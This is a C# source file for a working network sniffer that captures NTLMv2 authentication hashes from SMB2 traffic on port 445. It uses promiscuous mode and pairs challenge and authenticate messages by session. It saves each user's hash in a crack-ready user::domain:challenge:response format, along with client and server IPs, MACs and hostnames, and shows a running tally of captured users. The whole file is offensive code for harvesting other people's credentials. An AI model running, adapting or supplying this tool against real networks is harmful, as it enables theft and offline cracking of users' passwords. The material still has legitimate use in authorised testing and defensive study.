using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml;
using System.Xml.Serialization;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;

namespace NetNTLMSniff
{
    class Program
    {
        public static Dictionary<ulong, Dictionary<string,SMB2Datagram>> SMBSessionDictionary = new Dictionary<ulong, Dictionary<string, SMB2Datagram>>();
        public static Dictionary<string, int> CapturedUsers = new Dictionary<string, int>();

        public static string OutputFilePath = "C:\\<path_to_output_dir>\\<output_file_name>.txt";
        public static string OutputXmlFilePath = "C:\\<path_to_output_dir>\\<output_file_name>.xml";
        public static XmlDocument OutputXmlDocument = new XmlDocument();

        public static Dictionary<TKey, TValue> CloneDictionaryCloningValues<TKey, TValue>(Dictionary<TKey, TValue> original) where TValue : ICloneable
        {
            Dictionary<TKey, TValue> ret = new Dictionary<TKey, TValue>(original.Count, original.Comparer);
            foreach (KeyValuePair<TKey, TValue> entry in original)
            {
                ret.Add(entry.Key, (TValue)entry.Value.Clone());
            }
            return ret;
        }

        static void Main(string[] args)
        {
            // Retrieve the device list from the local machine
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;

            if (allDevices.Count == 0)
            {
                Console.WriteLine("No interfaces found! Make sure WinPcap is installed.");
                return;
            }

            // Print the list
            for (int i = 0; i != allDevices.Count; ++i)
            {
                LivePacketDevice device = allDevices[i];
                Console.Write((i + 1) + ". " + device.Name);
                DevicePrint(allDevices[i]);
            }

            int deviceIndex = 0;
            do
            {
                Console.WriteLine("Enter the interface number (1-" + allDevices.Count + "):");
                string deviceIndexString = Console.ReadLine();
                if (!int.TryParse(deviceIndexString, out deviceIndex) ||
                    deviceIndex < 1 || deviceIndex > allDevices.Count)
                {
                    deviceIndex = 0;
                }
            } while (deviceIndex == 0);


            if (File.Exists(OutputXmlFilePath))
            {
                try
                {
                    OutputXmlDocument.Load(OutputXmlFilePath);
                }
                catch { }
            }

            if(OutputXmlDocument.DocumentElement == null)
            {
                XmlNode xnode = OutputXmlDocument.CreateNode(XmlNodeType.Element, "ResultObjects", null);
                OutputXmlDocument.AppendChild(xnode);
            }
            
            // Take the selected adapter
            PacketDevice selectedDevice = allDevices[deviceIndex - 1];

            // Open the device
            using (PacketCommunicator communicator =
                selectedDevice.Open(65536,                                  // portion of the packet to capture
                                                                            // 65536 guarantees that the whole packet will be captured on all the link layers
                                    PacketDeviceOpenAttributes.Promiscuous, // promiscuous mode
                                    1000))                                  // read timeout
            {
                // Check the link layer. We support only Ethernet for simplicity.
                if (communicator.DataLink.Kind != DataLinkKind.Ethernet)
                {
                    Console.WriteLine("This program works only on Ethernet networks.");
                    return;
                }

                // Compile the filter
                using (BerkeleyPacketFilter filter = communicator.CreateFilter("tcp port 445"))
                {
                    // Set the filter
                    communicator.SetFilter(filter);
                }

                Console.WriteLine("Listening on " + selectedDevice.Description + "...");

                // start the capture
                communicator.ReceivePackets(0, PacketHandler);
            }
        }

        // Print all the available information on the given interface
        private static void DevicePrint(IPacketDevice device)
        {
            // Name
            Console.WriteLine(device.Name);

            // Description
            if (device.Description != null)
                Console.WriteLine("\tDescription: " + device.Description);
            else
                Console.WriteLine("\t(No description available)");

            // Loopback Address
            Console.WriteLine("\tLoopback: " +
                              (((device.Attributes & DeviceAttributes.Loopback) == DeviceAttributes.Loopback)
                                   ? "yes"
                                   : "no"));

            // IP addresses
            foreach (DeviceAddress address in device.Addresses)
            {
                Console.WriteLine("\tAddress Family: " + address.Address.Family);

                if (address.Address != null)
                    Console.WriteLine(("\tAddress: " + address.Address));
                if (address.Netmask != null)
                    Console.WriteLine(("\tNetmask: " + address.Netmask));
                if (address.Broadcast != null)
                    Console.WriteLine(("\tBroadcast Address: " + address.Broadcast));
                if (address.Destination != null)
                    Console.WriteLine(("\tDestination Address: " + address.Destination));
            }
            Console.WriteLine();
        }

        // Callback function invoked by libpcap for every incoming packet
        private static void PacketHandler(Packet packet)
        {
            // print timestamp and length of the packet
            //Console.WriteLine(packet.Timestamp.ToString("yyyy-MM-dd hh:mm:ss.fff") + " length:" + packet.Length);
            
            IpV4Datagram ipV4 = packet.Ethernet.IpV4;
            TcpDatagram tcp = ipV4.Tcp;
            Datagram tcpPayload = packet.Ethernet.IpV4.Tcp.Payload;
            
            /*
             
              Session Packet Types (in hexidecimal):

                       00 -  SESSION MESSAGE
                       81 -  SESSION REQUEST
                       82 -  POSITIVE SESSION RESPONSE
                       83 -  NEGATIVE SESSION RESPONSE
                       84 -  RETARGET SESSION RESPONSE
                       85 -  SESSION KEEP ALIVE

               Bit definitions of the FLAGS field:

                 0   1   2   3   4   5   6   7
               +---+---+---+---+---+---+---+---+
               | 0 | 0 | 0 | 0 | 0 | 0 | 0 | E |
               +---+---+---+---+---+---+---+---+

               Symbol     Bit(s)   Description

               E               7   Length extension, used as an additional,
                                   high-order bit on the LENGTH field.

               RESERVED      0-6   Reserved, must be zero (0)
             
            

                NetBIOS SESSION MESSAGE PACKET

                                    1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
                0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
               |      TYPE     |     FLAGS     |            LENGTH             |
               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
               |                                                               |
               /                                                               /
               /                           USER_DATA                           /
               /                                                               /
               |                                                               |
               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            */

            if (tcpPayload.Length > 8)
            {
                Int32 NetbiosSessionType = tcpPayload[0];
                Int32 NetbiosSessionFlags = (tcpPayload[1] >> 1);
                Int32 NetbiosSessionLength = ((tcpPayload[1] & 0x1) << 16) | (tcpPayload[2] << 8) | (tcpPayload[3]);

                // Look at the first 4 bytes in what is assumed to be an SMB2 payload. The first should be 0xfe; the second, the hex of "SMB".
                Int32 SMBPayloadLookAhead1 = tcpPayload[4];
                Int32 SMBPayloadLookAhead2 = (tcpPayload[5] << 16) | (tcpPayload[6] << 8) | (tcpPayload[7]);

                // Check that the TCP Payload is probably a NETBIOS SESSION MESSAGE packet
                if (NetbiosSessionType == 0 && NetbiosSessionLength == (tcpPayload.Length - 4) && SMBPayloadLookAhead1 == 0xfe && SMBPayloadLookAhead2 == 0x534d42)
                {
                    //https://msdn.microsoft.com/en-us/library/cc246529.aspx
                    //Console.WriteLine("NetBIOS Session Type: {0}\r\nNetbios Session Flags: {1}\r\nNetbios Session Payload Length: {2}", NetbiosSessionType, Convert.ToString(NetbiosSessionFlags, 2), NetbiosSessionLength);

                    var SMB2Packet = tcpPayload.Subsegment(4, (tcpPayload.Length - 4));
                    SMB2Datagram NewSMB2Datagram = new SMB2Datagram(SMB2Packet);
                    
                    
                    if(NewSMB2Datagram.IsValid == true)
                    {
                        if(NewSMB2Datagram.Command == SMB2Datagram.SMB2CommandNames.SESSION_SETUP)
                        {
                            if (!SMBSessionDictionary.ContainsKey(NewSMB2Datagram.SessionId))
                            {
                                SMBSessionDictionary[NewSMB2Datagram.SessionId] = new Dictionary<string, SMB2Datagram>();
                                SMBSessionDictionary[NewSMB2Datagram.SessionId]["AuthPacket"] = null;
                                SMBSessionDictionary[NewSMB2Datagram.SessionId]["ChallengePacket"] = null;
                            }

                            if(NewSMB2Datagram.SessionSetupResponse != null)
                            {
                                if (NewSMB2Datagram.SessionSetupResponse.NTLMSSPMessage != null)
                                {
                                    if (NewSMB2Datagram.SessionSetupResponse.NTLMSSPMessage.MessageType == SMB2Datagram.NTLMMessageType.NtLmChallenge)
                                    {
                                        SMBSessionDictionary[NewSMB2Datagram.SessionId]["ChallengePacket"] = NewSMB2Datagram;
                                    }
                                    else if (NewSMB2Datagram.SessionSetupResponse.NTLMSSPMessage.MessageType == SMB2Datagram.NTLMMessageType.NtLmAuthenticate)
                                    {
                                        SMBSessionDictionary[NewSMB2Datagram.SessionId]["AuthPacket"] = NewSMB2Datagram;
                                    }

                                    List<ulong> KeysToRemove = new List<ulong>();
                                    foreach (ulong SMBSessionId in SMBSessionDictionary.Keys)
                                    {
                                        if (SMBSessionDictionary[NewSMB2Datagram.SessionId]["AuthPacket"] != null && SMBSessionDictionary[NewSMB2Datagram.SessionId]["ChallengePacket"] != null)
                                        {
                                            SMB2Datagram.NTLMSSP_CHALLENGE_MESSAGE ChallengePacket = (SMB2Datagram.NTLMSSP_CHALLENGE_MESSAGE)SMBSessionDictionary[NewSMB2Datagram.SessionId]["ChallengePacket"].SessionSetupResponse.NTLMSSPMessage;
                                            SMB2Datagram.NTLMSSP_AUTHENTICATE_MESSAGE AuthPacket = (SMB2Datagram.NTLMSSP_AUTHENTICATE_MESSAGE)SMBSessionDictionary[NewSMB2Datagram.SessionId]["AuthPacket"].SessionSetupResponse.NTLMSSPMessage;

                                            if (AuthPacket.NtChallengeResponse == null)
                                                continue;

                                            string NtChallengeString = BitConverter.ToString(AuthPacket.NtChallengeResponse.ToArray()).Replace("-", "");
                                            NtChallengeString = (NtChallengeString.Substring(0, 32) + ":" + NtChallengeString.Substring(32)).ToLower();

                                            string ServerChallengeString = (BitConverter.ToString(ChallengePacket.ServerChallenge.ToArray()).Replace("-", "")).ToLower();
                                            
                                            if (string.IsNullOrEmpty(AuthPacket.DomainName))
                                            {
                                                if(CapturedUsers.ContainsKey(string.Format("\\\\{0}", AuthPacket.UserName)))
                                                    CapturedUsers[string.Format("\\\\{0}", AuthPacket.UserName)] += 1;
                                                else
                                                    CapturedUsers[string.Format("\\\\{0}", AuthPacket.UserName)] = 1;
                                            }
                                            else
                                            {
                                                if (CapturedUsers.ContainsKey(string.Format("{0}\\{1}", AuthPacket.DomainName, AuthPacket.UserName)))
                                                    CapturedUsers[string.Format("{0}\\{1}", AuthPacket.DomainName, AuthPacket.UserName)] += 1;
                                                else
                                                    CapturedUsers[string.Format("{0}\\{1}", AuthPacket.DomainName, AuthPacket.UserName)] = 1;
                                            }

                                            Console.Clear();
                                            Console.WriteLine("NTLMv2 Hashes Captured ({0}):", CapturedUsers.Count);
                                            foreach(var CapturedUser in CapturedUsers.OrderByDescending(x => x.Value))
                                            {
                                                Console.WriteLine("\t{0}: {1}", CapturedUser.Key, CapturedUser.Value);
                                            }

                                            //Console.WriteLine("{0}::{1}:{2}:{3}", AuthPacket.UserName, AuthPacket.DomainName, ServerChallengeString, NtChallengeString);

                                            if (!File.Exists(OutputFilePath))
                                            {
                                                using (StreamWriter sw = File.CreateText(OutputFilePath))
                                                {
                                                    sw.WriteLine("{0}::{1}:{2}:{3}", AuthPacket.UserName, AuthPacket.DomainName, ServerChallengeString, NtChallengeString);
                                                }
                                            }
                                            else
                                            {
                                                using (StreamWriter sw = File.AppendText(OutputFilePath))
                                                {
                                                    sw.WriteLine("{0}::{1}:{2}:{3}", AuthPacket.UserName, AuthPacket.DomainName, ServerChallengeString, NtChallengeString);
                                                }
                                            }

                                            ResultObject NewResult = new ResultObject();
                                            NewResult.CaptureTimestamp = packet.Timestamp;
                                            NewResult.ClientDomainName = AuthPacket.DomainName;
                                            NewResult.ClientHostName = AuthPacket.Workstation;
                                            NewResult.ClientVersion = ChallengePacket.Version;
                                            NewResult.NtChallengeString = NtChallengeString;
                                            NewResult.ServerChallenge = ServerChallengeString;
                                            NewResult.ServerDomainName = ChallengePacket.TargetName;
                                            NewResult.UserName = AuthPacket.UserName;

                                            if (tcp.SourcePort != 445 && tcp.DestinationPort == 445)
                                            {
                                                NewResult.ClientMac = packet.Ethernet.Source.ToString();
                                                NewResult.ClientIp = ipV4.Source.ToString();
                                                NewResult.ClientPort = tcp.SourcePort;
                                                NewResult.ServerMac = packet.Ethernet.Destination.ToString();
                                                NewResult.ServerIp = ipV4.Destination.ToString();
                                                NewResult.ServerPort = tcp.DestinationPort;
                                            }
                                            else if (tcp.DestinationPort != 445 && tcp.SourcePort == 445)
                                            {
                                                NewResult.ClientMac = packet.Ethernet.Destination.ToString();
                                                NewResult.ClientIp = ipV4.Destination.ToString();
                                                NewResult.ClientPort = tcp.DestinationPort;
                                                NewResult.ServerMac = packet.Ethernet.Source.ToString();
                                                NewResult.ServerIp = ipV4.Source.ToString();
                                                NewResult.ServerPort = tcp.SourcePort;
                                            }
                                            
                                            if (ChallengePacket.AttributeValuePairs.Contains("MsvAvNbComputerName"))
                                            {
                                                NewResult.ServerHostName = (string)ChallengePacket.AttributeValuePairs["MsvAvNbComputerName"];
                                            }
                                            else if (ChallengePacket.AttributeValuePairs.Contains("MsvAvDnsComputerName"))
                                            {
                                                NewResult.ServerHostName = (string)ChallengePacket.AttributeValuePairs["MsvAvDnsComputerName"];
                                            }

                                            XmlNode xnode = OutputXmlDocument.CreateNode(XmlNodeType.Element, "ResultObjects", null);
                                            XmlSerializer xSeriz = new XmlSerializer(typeof(ResultObject));
                                            XmlSerializerNamespaces ns = new XmlSerializerNamespaces(new XmlQualifiedName[] { new XmlQualifiedName("", "") });
                                            XmlWriterSettings writtersetting = new XmlWriterSettings();
                                            writtersetting.OmitXmlDeclaration = true;

                                            StringWriter stringWriter = new StringWriter();
                                            using (XmlWriter xmlwriter = System.Xml.XmlWriter.Create(stringWriter, writtersetting))
                                            {
                                                xSeriz.Serialize(xmlwriter, NewResult, ns);
                                            }

                                            xnode.InnerXml = stringWriter.ToString();
                                            XmlNode bindxnode = xnode.SelectSingleNode("ResultObject");
                                            OutputXmlDocument.DocumentElement.AppendChild(bindxnode);
                                            OutputXmlDocument.Save(OutputXmlFilePath);

                                            KeysToRemove.Add(SMBSessionId);
                                            SMBSessionDictionary[NewSMB2Datagram.SessionId]["AuthPacket"] = null;
                                            SMBSessionDictionary[NewSMB2Datagram.SessionId]["ChallengePacket"] = null;
                                        }
                                    }

                                    foreach(ulong KeyToRemove in KeysToRemove)
                                    {
                                        SMBSessionDictionary.Remove(KeyToRemove);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        
    }
    
    public class ResultObject
    {
        public DateTime CaptureTimestamp;
        public string ClientDomainName;
        public string ClientIp;
        public string ClientHostName;
        public string ClientMac;
        public ushort ClientPort;
        public ulong ClientVersion;
        public string NtChallengeString;
        public string ServerChallenge;
        public string ServerDomainName;
        public string ServerIp;
        public string ServerHostName;
        public string ServerMac;
        public ushort ServerPort;
        public string UserName;
    }
}
